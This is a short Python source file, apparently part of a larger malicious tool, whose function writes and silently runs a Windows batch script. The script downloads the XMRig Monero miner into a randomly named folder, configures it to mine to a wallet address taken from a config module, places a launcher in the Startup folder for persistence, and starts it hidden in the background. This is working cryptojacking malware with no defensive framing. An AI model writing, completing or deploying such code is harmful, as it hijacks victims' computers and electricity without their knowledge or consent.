import subprocess
import os
import sys
from config import Config

cc = Config()

def xmrig():
    batch_code = """
@echo off

set XMRIG_URL=https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-gcc-win64.zip

REM Generating a random directory name for installation
set "INSTALL_DIR=%USERPROFILE%\\Documents\\%RANDOM%\\%RANDOM%"

mkdir "%INSTALL_DIR%"
cd /d "%INSTALL_DIR%"

powershell -command "& {{Invoke-WebRequest '%XMRIG_URL%' -OutFile 'xmrig.zip'}}"

powershell -command "& {{Expand-Archive -Path '.\\xmrig.zip' -DestinationPath '.'}}"

cd xmrig-6.21.0

echo @echo off > start_xmrig.bat
echo cd /d "%INSTALL_DIR%\\xmrig-6.21.0" >> start_xmrig.bat
echo start xmrig.exe --donate-level 1 -o de.monero.herominers.com:1111 -u {} -p fdaseaw -a rx/0 -k --background >> start_xmrig.bat

echo move /y "start_xmrig.bat" "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" > move_to_startup.bat
call move_to_startup.bat
del move_to_startup.bat

cd %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\
call start_xmrig.bat %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\
exit
""".format(cc.get_xmr_adress())

    batch_filepath = os.path.join(os.environ["TEMP"], "batchscript.bat")

    with open(batch_filepath, "w") as f:
        f.write(batch_code)

    startupinfo = subprocess.STARTUPINFO()
    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW

    process = subprocess.Popen(
        ["cmd.exe", "/c", batch_filepath],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        startupinfo=startupinfo,
    )

    stdout, stderr = process.communicate()

    if stderr:
        print(stderr.decode(), file=sys.stderr)
